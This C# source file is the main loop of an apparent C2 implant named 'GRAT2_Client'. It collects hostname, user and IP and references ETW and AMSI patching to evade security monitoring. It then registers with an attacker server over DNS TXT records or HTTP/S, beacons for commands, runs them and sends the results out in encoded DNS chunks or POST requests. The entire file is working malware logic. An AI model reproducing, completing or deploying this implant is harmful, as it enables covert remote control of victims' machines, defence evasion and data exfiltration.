using System;
using System.Net;
using System.Text;

namespace GRAT2_Client.PInvoke
{
    class Program
    {
        static void Main(string[] args)
        {

            int i = 1;
            string receivedTask = "";
            string agentName = Config.RandomString(12);
            string dnsSubDomain = Config.RandomString(6);
            string agentDetails = agentName + "   " + Execute.hostname() + "   " + Execute.whoami() + "      " + Execute.getLocalIP();

            if (Config.sandboxEvasion)
            {
                _ = Config.patchEtw;
                _ = Config.patchAmsi;

                try
                {
                    if (Config.DNSListener == 1)
                    {
                        int agentNumOfChunk = DNSClient.numberOfChunks(Encryption.xor(agentDetails + "   " + "   DNS"));
                        DNSClient.request = "agent." + Encryption.ToBase64URL(Encoding.UTF8.GetBytes(String.Format("{0}", agentNumOfChunk))) + "." + dnsSubDomain +"." + Config.DNSServer; // initial DNS agent
                        DNSClient.DnsResolver.GetTXTRecord(DNSClient.request);
                        DNSClient.SendChunk();
                    }
                    else
                    {
                        Client.PostResults("", Config.c2 + Config.initialUrl, agentDetails + "   " + "   HTTP/s"); // initial HTTP/s agent
                    }
                    while (true)
                    {
                        if (i > 0)
                        {
                            if (Config.DNSListener == 1)
                            {
                                System.Threading.Thread.Sleep(Config.sleep * 1000);
                                DNSClient.request = "checker." + agentName + "." + Config.DNSServer;
                                string encodedTasks = DNSClient.DnsResolver.GetTXTRecord(DNSClient.request);
                                if (encodedTasks != "OK")
                                {
                                    receivedTask = Encryption.base64_Decode(encodedTasks);
                                }

                            }
                            else
                            {
                                System.Threading.Thread.Sleep(Config.sleep * 1000);
                                receivedTask = Client.GetRequest(Config.checker_url, agentName); // beaconing and tasking
                            }


                        }
                        i++;
                        string[] obfTasks = receivedTask.Split(' ');

                        if (!Tasks.ValidArguments.Contains(obfTasks[0]))
                        {
                            // do nothing
                        }
                        else
                        {
                            string results = Tasks.Run(obfTasks);

                            if (Config.DNSListener == 1)
                            {
                                int resultsNumOfChunk = DNSClient.numberOfChunks(Encryption.xor(results));
                                DNSClient.request = "results." + Encryption.ToBase64URL(Encoding.UTF8.GetBytes(String.Format("{0}", resultsNumOfChunk))) + "." + dnsSubDomain + "." + Config.DNSServer;
                                DNSClient.DnsResolver.GetTXTRecord(DNSClient.request);
                                DNSClient.SendChunk();
                            }
                            else
                            {
                                Client.PostResults(results, Config.c2 + Config.sendResults, agentName); // Post Results
                            }
                                                        
                        }
                    }
                 }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);

                }
            }
        
        }
    }
}
